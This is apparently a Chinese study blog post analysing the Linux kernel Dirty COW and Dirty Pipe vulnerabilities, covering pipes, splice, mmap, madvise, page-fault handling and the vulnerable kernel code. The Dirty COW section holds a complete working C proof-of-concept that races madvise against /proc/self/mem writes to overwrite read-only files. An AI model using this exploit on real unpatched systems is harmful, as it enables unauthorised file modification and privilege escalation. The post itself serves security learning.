---
date: 2024-9-29
tag:
  - pwn
  - kernel
---

# 不好看的linux内核学习(2) dirty pipe/cow学习

> 参考文章:https://blog.csdn.net/jasonliuvip/article/details/22600569
>
> https://zhuanlan.zhihu.com/p/25918300
>
> https://blog.csdn.net/hbhgyu/article/details/106245182
>
> mmap函数:https://blog.csdn.net/qq_41687938/article/details/119901916
>
> 脏页面:https://blog.csdn.net/shift_wwx/article/details/122497891
>
> 匿名页:https://blog.csdn.net/jasonchen_gbd/article/details/79462014
>
> linux下的特殊文件:https://blog.csdn.net/pi9nc/article/details/18257593
>
> 反向映射机制:https://zhuanlan.zhihu.com/p/363319174
>
> madvise函数:https://blog.csdn.net/sz66cm/article/details/139334306
>
> dirty cow详解:https://xuanxuanblingbling.github.io/ctf/pwn/2019/11/18/race/ (巨推荐)
>
> get_user_pages:https://zhuanlan.zhihu.com/p/579444153
>
> 缺页异常：https://www.anquanke.com/post/id/290851
>
> pde和pte:https://blog.csdn.net/q1007729991/article/details/52723478
>
> 管道:https://zhuanlan.zhihu.com/p/470183989
>
> Dirty pipe :https://blog.csdn.net/void_zk/article/details/125884637
>
> Pipe_write源码分析:https://xz.aliyun.com/t/11016?time__1311=Cq0x2QD%3DqDT4l2zYGQqpxQq0I1tqWumD
>
> linux寻址机制:https://www.cnblogs.com/binlovetech/p/17571929.html

## 前置知识

### 管道

#### 使用流程

- 父进程使用pipe 创建一个管道
- 然后fork创建一个子进程
- 然后继承父进程打开的fd

#### 环形缓冲区 (Ring Buffer)

内核中,管道采用了环形缓冲区进行存储数据. 比如16个内存页构成的环形缓冲区.

管道是通过`pipe_inode_info`对象进行管理的

```c
struct pipe_inode_info {
	struct mutex mutex;
	// 等待队列,存储正在等待的管道可读或者可写的进程
	wait_queue_head_t wait;
	// 表示没读的数据占据多少个内存页 (no read bufs)
	// curbuf: current buffer 表示当前正在读取的环形缓冲区的哪个内存页中的数据
	unsigned int nrbufs, curbuf, buffers;
	// 表示正在读取管道的进程数
	unsigned int readers;
	// 表示正在写入管道的进程数
	unsigned int writers;
	unsigned int files;
	//  等待管道可写的进程数
	unsigned int waiting_writers;
	unsigned int r_counter;
	unsigned int w_counter;
	struct page *tmp_page;
	struct fasync_struct *fasync_readers;
	struct fasync_struct *fasync_writers;
	// 环形缓冲区
	struct pipe_buffer *bufs;
};
```

- 然后bufs有十六个`pipe_buffer`对象构成

```c

/**
 *	struct pipe_buffer - a linux kernel pipe buffer
 *	@page: the page containing the data for the pipe buffer
 *	@offset: offset of data inside the @page
 *	@len: length of data inside the @page
 *	@ops: operations associated with this buffer. See @pipe_buf_operations.
 *	@flags: pipe buffer flags. See above.
 *	@private: private data owned by the ops.
 **/
struct pipe_buffer {
	// pipe_buffer所占的内存页
	struct page *page;
	// 进程正在读取的数据在page中的偏移量
	// len表示内存页拥有的未读数据的长度
	unsigned int offset, len;
	const struct pipe_buf_operations *ops;
	unsigned int flags;
	unsigned long private;
};
```

### PDE 和 PTE 

PDE 是页目录表项。而 PTE是页表表项。

### 脏页面

当你通过任何一种方式从磁盘读文件时(read/mmap)，内核都会给你申请一个**page cache**来缓存硬盘上的内容

linux一般修改的文件数据并不会马上同步到磁盘，会缓存在内存的page cache中 我们把这种和磁盘数据不一致的页称为脏页 然后linux会标记这种内存页为`dirty`

### splice函数

**splice** 用于在两个文件描述符之间移动数据， 也是零拷贝（sendfile）splice其实一般用于管道的读取或者输出,从管道里面读取数据或者将数据放入管道里面 也就是fn_in到fd_outx

```c
#include <fcntl.h>
ssize_t splice(int fd_in, loff_t *off_in, int fd_out, loff_t *off_out, size_t len, unsigned int flags);
```

- Fd_in参数是待输入描述符

- Off_in表示从输入的数据流何处开始读取

- Off_out 也就是表示从输出数据流何处开始读取

- len表示移动数据的长度

- flags参数表示数据移动的方式

  - `SPLICE_F_NONBLOCK` 其实重点在后面的noneblock 也就是splice操作不堵塞

  - `SPLICE_F_MORE` 告诉内核下一个splice调用会有更多的数据穿入
  - `SPLICE_F_MOVE`如果输出是文件，那么就会让kernel尝试从输入管道的缓冲区直接将数据读入输出地址空间,这个过程无任何数据拷贝发生

- 失败返回值为-1

#### 调用链

最终文件与管道间的分流发生在 `do_splice()` 函数：

- 从管道读取到管道，调用 `splice_pipe_to_pipe()`
- 从文件读取到管道，调用 `splice_file_to_pipe()`
- 从管道读取到文件，调用 `do_splice_from()`

然后调用splice_file_to_pipe的时候会调用do_splice_to()

然后do_splice_to()调用`splice_read` 指针也就是generic_file_splice_read

```c
ext4_file_read_iter()
    generic_file_read_iter()
        filemap_read()
            filemap_get_pages() // 获取到文件对应映射的页面集
            copy_page_to_iter() // 进行页面拷贝（单位为单个页面）
                __copy_page_to_iter()
                    copy_page_to_iter_pipe()    // 我们是管道，所以走入该分
```

- 最终实现copy_page_to_iter_pipe函数中,即是漏洞所在位置

### /proc/self/mem

> /proc/self算是一个链接,也就是进程可以通过这个链接获取到当前进程的信息 等效成/proc/pid 

`Proc`用户可以用于拿来查询linux kernel相关的信息,文件流访问进程的信息

- /proc/pid/cmdline 开始进程的命令

- /proc/pid/cwd 也就是进程的工作目录的链接

- /proc/pid/environ 进程可用环境变量信息
- /proc/pid/fd 也就是进程打开的所有文件链接
- /proc/pid/mem 包含了进程在内存的内容
  - 可以通过读写这个文件来实现直接读写虚拟内存空间 无视内存映射的权限设置
- /proc/pid/stat (status 包含了进程的状态信息
- /proc/pid/statm (status memory)包含了进程的内存使用信息

### COW

主要执行三个重要步骤:

- 制作映射内存的副本
- 更新页表,让虚拟内存重定位到新创建的物理内存内
- 写入内存

一般操作的时候，我们需要保证操作是原子性的,否则就容易被条件竞争，这也就是dirty cow的漏洞成因

### mmap

> 参考文章:https://blog.csdn.net/qq_41687938/article/details/119901916
>
> 详细解释https://segmentfault.com/a/1190000044229036
>
> linux内核使用vm_area_struct结构来表示一个独立的虚拟内存区域 因此一个进程使用多个vm_area_struct结构来分别表示不同类型的虚拟内存区域 比如一个vm_area_struct结构体就代表了text段一样 vm_area_struct主要是包含了一个区域的**起始** 和**结束** 并且包含**vm_ops**指针可以引用所有针对这个区域可以使用的系统调用函数

```c
void *mmap(void *start, size_t length, int prot, int flags, int fd, off_t offset);
```

- Start, length无需多言

- prot 表示映射区域的保护模式

  - PROT_EXEC 可执行

  - PROT_READ 可读
  - PROT_WRITE 可写
  - PROT_NONE 不能存取

- Flags 表示映射区域的各种特性,

  - MAP_FIXED start参数所指地址无法成功建立映射的时候,直接放弃映射,并且不对地址做修正
  - MAP_SHARED 对映射区的写入操作会复制回文件内,而且允许其他映射文件的进程共享
  - MAP_PRIVATE 对映射区域的写入操作会产生一个映射文件的复制,即私人**cow** 因为会额外copy一个新的内存页所以任何修改都不会写回原本的文件内容(不知道会不会)
  - MAP_ANONYMOUS  建立匿名映射,此时回直接忽略fd,不涉及文件,而且也会和其他进程进行共享
  - MAP_DENYWRITE(deny write) 只允许对映射区域进行写入
  - MAP_LOCAKED 将映射区域锁定住,表示不会产生swap（置换）

- Fd 也就是要映射到内存中的文件描述符

  - 如果是匿名内存映射,就要设置`MAP_ANONYMOUS` flags参数 然后将fd设置为-1
  - 如果有些系统不支持匿名内存映射,可以通过fopen("/dev/zero")然后对这个的文件描述符进行映射 也是可以实现匿名内存映射的
    - `/dev/zero`全是空白字符,可以利用这个创建一片干净的内存区域
    - `/dev/null`只能往里面写入,但是读取会EOF,所以可以当作垃圾桶 比如**cat flag >> /dev/null**这样就可以把数据丢进/dev/null里面

#### mmap映射的文件页

> 参考文章:https://blog.csdn.net/shift_wwx/article/details/122497891
>
> 正反向映射:https://zhuanlan.zhihu.com/p/363319174

- 第一次访问文件页时,发生缺页后读文件页到`page cache`里面,如果是写则设置页表项为`dirty`,可以写

- 脏页回写的时候,会通过**反向映射机制**(流程较为复杂),查找映射这个页的每一个vma,设置相应进程的页表项为只读,清理脏标

  - `正向映射` 就是当访问**虚拟地址**的时候需要转化为**物理地址**

  - `反向映射` 在以前为了找到一个物理页面的对应页表项 需要去遍历`mm`（mm_struct 用于管理进程虚拟内存空间的全部信息）然后再遍历`mm`的`vma`(vm_area_struct 也就是各种匿名内存页的详细信息)  导致效率及其低下。 所以后面设计出来了**反向映射 比如struct ano_vma 我们匿名页面的`page`和`mapping`指向结构体

- 若映射成功则返回映射区的内存起始地址，否则返回MAP_FAILED(－1)，错误原因存于errno 中。

### madvise函数

> 参考文章:https://blog.csdn.net/sz66cm/article/details/139334306

```c
int madvise(void *addr, size_t length, int advice);
```

- 也就是向内核提建议
- 给addr到addr+len的内存区域的建议
  - MADV_NORMAL：默认的内存访问行为，不需要特别的优化。
  - MADV_RANDOM：进程将以随机顺序访问指定的内存区域。内核可以优化分页算法以适应这种访问模式。
  - MADV_SEQUENTIAL：进程将以顺序方式访问指定的内存区域。内核可以优化分页算法以适应这种访问模式。
  - MADV_WILLNEED：进程将很快访问指定的内存区域。内核会尝试预读这些页面以减少缺页异常。
  - MADV_DONTNEED：进程不再需要指定的内存区域。内核可以释放这些页面，但在以后访问时会重新分配。
  - MADV_FREE：告知内核此内存区域可以丢弃，但如果没有内存压力，则保留当前内容，直到进程再次写入。这对于短期内可能会再次使用的内存区域很有用。
  - MADV_REMOVE：请求将指定的内存区域中的内容丢弃，并释放相关的物理内存。
  - MADV_DONTFORK：在 fork() 系统调用时，不复制指定的内存区域。
  - MADV_DOFORK：撤销 MADV_DONTFORK 设置，使 fork() 复制该内存区域。
  - MADV_MERGEABLE：将内存区域标记为可合并，内核将尝试将具有相同内容的内存页面合并。
  - MADV_UNMERGEABLE：撤销 MADV_MERGEABLE 设置。

### PTE内核如何通过pte管理内存的映射关系

> 参考文章:https://www.cnblogs.com/binlovetech/p/17571929.html

内核会从物理内存空间中拿出一个物理内存页来专门存储进程里的这些内存映射关系,内核会在页表中划分出来一个个大小相等的小内存块，这些小内存块我们称之为页表项 PTE（Page Table Entry）

我们一般将管理pte的页表叫做页目录也就是**pde**,我们通过取出虚拟地址的不同段,然后层层找到我们的pte从而找到我们的内存页面

## DirtyCOW漏洞成因

### mmap cow

前面提及过mmap再`MAP_PRIVATE`flags的时候会产生一个映射复制也就是**cow**

- 此时允许程序通过`write`系统调用向这块私有进程进行写入操作,但是只会改变映射内存的副本不会改变映射内存本身

### madvise 

前面的madvise有个flags也就是：

```json
MADV_DONTNEED：进程不再需要指定的内存区域。内核可以释放这些页面，但在以后访问时会重新分配。
```

- 告知内核不再需要声明地址的内存,让内核释放内存地址的资源,并且进程的页表指向原始物理内存

### 结合

mmap cow的过程是：

- 创建内存副本
- 进程页表指向原始物理内存的副本
- 向副本写入数据

然后在第二步的时候如果我们恰好能执行madvise从而让副本释放掉,就会将进程的页表重新指向原始的映射内存物理块,那么再次写入数据的时候就会导致只读文件被写入数据

## DirtyCow源码分析

> 参考文章:https://www.cnblogs.com/mrliu0327/p/13456502.html
>
> https://zhuanlan.zhihu.com/p/579444153
>
> 缺页异常：https://www.anquanke.com/post/id/290851

- 要写一个只读文件的内容（vma->flags只读属性）
- 先把文件内容读出来（pagecache）
- 第一次去写，页不在内存，pte entry无效
- do_cow_page()函数处理，并将文件内容载入内存（回写机制）
- 然后复制到一个匿名内存页，属性是dirty井且RO
尝试follow_page，不成功，因为要求写（FOLL_WRITE）但是页面不可写
- 发生写错误缺页中断
- 尝试将页属性改为可写（do_wp_page），但由于vma->flags是只读，不成功
- 返回VM_FAULT_WRITE，之后丢掉FOLL_WRITE
- 再次follow_page（get_user_page中）
-此时如果正常的话，返回匿名内存页，虽然是只读，但是硬写没问题
- 但是，此时杀过来一个madvice，把匿名内存页释放
- 再次follow_page失败，因为对应的内存不在了
- 但是要求仅仅是只读（FOLL_WRITE已经被去掉了），所以直接返回
pagecache对应的内存页，写入之后由于回写机制，会将修改返回真实文件
- DONE！

缺页异常处理大致流程（详细的会在后面单独写一篇blog进行记录）

```c
//__do_page_fault()
//    __handle_mm_fault()
//        handle_pte_fault()
//            do_wp_page() ==> pte在主存中，写缺页
//            do_fault() ==> pte不在主存中，及第一次非匿名页处理流程
//                do_read_fault()
//                do_cow_fault() ==> 写操作引起的缺页错误
//                do_shared_fault()
```

- `_do_page_fault`函数
  - 判断 `address` 是位于内核地址空间还是用户地址空间
  - 位于内核地址空间：
    - 满足相关条件，进行 `vmalloc_fault` 处理
  - 位于用户地址空间：
    - 写错误，设置 `FAULT_FLAG_WRITE` 标志
    - 满足条件，进行 `handle_mm_fault` 处理

- `__handle_mm_fault`函数

  - 分配各级页表项，并获取页表项
  - 正常的话，最后进行 `handle_pte_fault` 缺页处理

- `handle_pte_fault`函数

  - 获取页表项中的内存页

  - 该页不在主存中 
    - 如果pte页表为空 则匿名页进行`do_anonymous_pages`处理 非匿名页 进行`do_fault`函数执行
    - 如果pte页表不为空 则从交换区将页面换回主存 从交换区换回页面到主存中 缺页写错误 对应页面不可写,就调用`do_wp_page`进行cow 可写就标脏 （可以回写）如果非缺页写错误 就更新pte页表项

- 调用`do_fault`时

  - 由读操作引起的缺页，则进行 `do_read_fault` 处理
  - **由写私有映射引起的缺页，则进行 `do_cow_fault` 处理**
  - 其他操作引起的缺页，则进行 `do_shared_fault` 处理

- 所以通过mmap携带``MAP_PRIVATE` flags可以触发do_cow_fault函数 (其实也就是检查vma->vm_flags & VM_SHARED)

  - 分配一个新的页
  - 更新页表项

```c
long __get_user_pages(struct task_struct *tsk, struct mm_struct *mm,
		unsigned long start, unsigned long nr_pages,
		unsigned int gup_flags, struct page **pages,
		struct vm_area_struct **vmas, int *nonblocking)
```

**__get_user_pages** 函数 能够获取用户进程调用的虚拟地址之后的物理地址 也就是当进行写入私有映射的内存页时，会经过一个COW(写时拷贝)的过程（ 即复制只读页生成一个带有写权限的新页，原始页可能是私有保护不可写的 ）

```c
long __get_user_pages(struct task_struct *tsk, struct mm_struct *mm,
		unsigned long start, unsigned long nr_pages,
		unsigned int gup_flags, struct page **pages,
		struct vm_area_struct **vmas, int *nonblocking)
{
		...
		page = follow_page_mask(vma, start, foll_flags, &page_mask);
		if (!page) {
			int ret;
			ret = faultin_page(tsk, vma, start, &foll_flags,
					nonblocking);
			switch (ret) {
			case 0:
				goto retry;
			case -EFAULT:
			case -ENOMEM:
			case -EHWPOISON:
				return i ? i : ret;
			case -EBUSY:
				return i;
			case -ENOENT:
				goto next_page;
			}
			BUG();
		}
		...
		nr_pages -= page_increm;
	} while (nr_pages);
	return i;
}
```

- 我们可以看见`faultin_page`会申请内存管理的权限

  ```c
  static int faultin_page(struct task_struct *tsk, struct vm_area_struct *vma,
  		unsigned long address, unsigned int *flags, int *nonblocking)
  {
  	struct mm_struct *mm = vma->vm_mm;
  	unsigned int fault_flags = 0;
  	int ret;
  
  	...
  	if ((ret & VM_FAULT_WRITE) && !(vma->vm_flags & VM_WRITE))
  		*flags &= ~FOLL_WRITE;
  	return 0;
  }
  ```

  - 漏洞代码就是

    ```c
    if ((ret & VM_FAULT_WRITE) && !(vma->vm_flags & VM_WRITE))
    		*flags &= ~FOLL_WRITE;
    ```

    如果当前VMA中的标志显示当前页不可写，但是用户又执行了页的写操作，那么内核会执行COW操作 并且在处理中会有VM_FAULT_WRITE标志 也就是执行cow操作后,会益处FOLL_WRITE标志

### POC

```c
#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>

void *map;
int f;
struct stat st;
char *name;

void *madviseThread(void *arg)
{
  char *str;
  str=(char*)arg;
  int i,c=0;
  for(i=0;i<100000000;i++)
  {
    c+=madvise(map,100,MADV_DONTNEED);
  }
  printf("madvise %d\n\n",c);
}

void *procselfmemThread(void *arg)
{
  char *str;
  str=(char*)arg;
  int f=open("/proc/self/mem",O_RDWR);
  int i,c=0;
  for(i=0;i<100000000;i++) {
    lseek(f,map,SEEK_SET);
    c+=write(f,str,strlen(str));
  }
  printf("procselfmem %d\n\n", c);
}

int main(int argc,char *argv[])
{
  if (argc<3)return 1;
  pthread_t pth1,pth2;
  f=open(argv[1],O_RDONLY);
  fstat(f,&st);
  name=argv[1];
  map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
  printf("mmap %x\n\n",map);
  pthread_create(&pth1,NULL,madviseThread,argv[1]);
  pthread_create(&pth2,NULL,procselfmemThread,argv[2]);
  pthread_join(pth1,NULL);
  pthread_join(pth2,NULL);
  return 0;
}
```

### mmap私有映射文件

> 学习文章:https://segmentfault.com/a/1190000044229036
>
> 其实是在分析dirty cow的时候对内存文件页面的映射不是特别清楚,所以单独研究一下mmap私有映射文件

堆和栈之间,其实就是mmap进行从操作的区域,mmap出来一般就是vm_area_struct(**VMA**)结构来表示

进程虚拟内存空间中的**VMA**有两种组织形式(同时存在):

```c
// 进程虚拟内存空间描述符
struct mm_struct {
    // 串联组织进程空间中所有的 VMA  的双向链表 
    struct vm_area_struct *mmap;  /* list of VMAs */
    // 管理进程空间中所有 VMA 的红黑树
    struct rb_root mm_rb;
  	....
}
// 虚拟内存区域描述符
struct vm_area_struct {
    // vma 在 mm_struct->mmap 双向链表中的前驱节点和后继节点
    struct vm_area_struct *vm_next, *vm_prev;
    // vma 在 mm_struct->mm_rb 红黑树中的节点
    struct rb_node vm_rb;
  	...
}
```

- **双向链表**
- **红黑树**

根据 mmap 创建出的这片虚拟内存区域背后所映射的**物理内存**能否在多进程之间共享,细分两种映射方式

- `MAP_SHARED `表示共享映射，通过 mmap 映射出的这片内存区域在多进程之间是共享的，一个进程修改了共享映射的内存区域，其他进程是可以看到的，用于多进程之间的通信。
- `MAP_PRIVATE `表示私有映射，通过 mmap 映射出的这片内存区域是进程私有的，其他进程是看不到的。如果是私有文件映射，那么多进程针对同一映射文件的修改将不会回写到磁盘文件上

  这个就很符合开发思路,比如同一份二进制程序执行多个进程,代码段对于多进程来说是只读的所以就共享一块内存,然后data段等每个进程都是独立的,写的时候在单独进行修改.并且不会写回原本的二进制程序.所以在这个flags被用于**load_aout_binary**也就是加载可执行程序

那么我们可以通过mmap私有映射文件,携带flags:`MAP_PRIVATE`

- 先打开文件,创建vm_area_struct存储file指针 然后创建file结构体来描述打开的文件
- 用`fd_array`找一个空闲位置分配,下标就是文件描述符
- 读取内容的时候,内核会将文件变成多个缓冲页面存放在内存中(**page cache**) inode结构会存储指向**page_cache**的指针,也就是struct address_space **i_mapping**, 每个**page_cache**会存储文件所有的缓存页面
- 当第一次读取的时候会触发缺页异常,创建文件内存页面对应的pte,与page cache关联起来
- 当要写入的时候,因为是私有映射所以pte应该是只读的,会产生一个写保护类型的缺页中断,然后会重新申请一个内存页面,将page cache里面拷贝过去然后改成可写

## DirtyPipe漏洞成因

> 参考文章:https://blog.csdn.net/void_zk/article/details/125884637

- 没有初始化pip_buffer->flags属性

```c
struct pipe_buffer {
	// pipe_buffer所占的内存页
	struct page *page;
	// 进程正在读取的数据在page中的偏移量
	// len表示内存页拥有的未读数据的长度
	unsigned int offset, len;
	const struct pipe_buf_operations *ops;
	unsigned int flags;
	unsigned long private;
};
```

也就是当我们调用`slice`函数的时候,会利用管道当作缓冲区。比如A文件内容移动到B文件,那么我们就会调用slice将A的数据转移到管道,然后从管道将数据发送给B。

那么当文件读取到管道会调用`splice_file_to_pipe`本质调用的就是`copy_page_to_iter_pipe`函数,然后这个函数会将pipe_buffer->page设置为`文件映射的页面`对应的page(page引用+1)head也会加1

```c
buf->ops = &page_cache_pipe_buf_ops;
// 引用+1
get_page(page);
// 设置文件内存页面直接为page 省去反复copy的过程
buf->page = page;
// 设置偏移
buf->offset = offset;
// 设置总字节数
buf->len = bytes;
```

- 我们可以发现这里是没有重新设置flags的也就是我们在pipe_write中设置的`PIPE_BUF_FLAG_CAN_MERGE`标志,携带标志我们可以在pipwrite的时候往文件映射的内存页中写入数据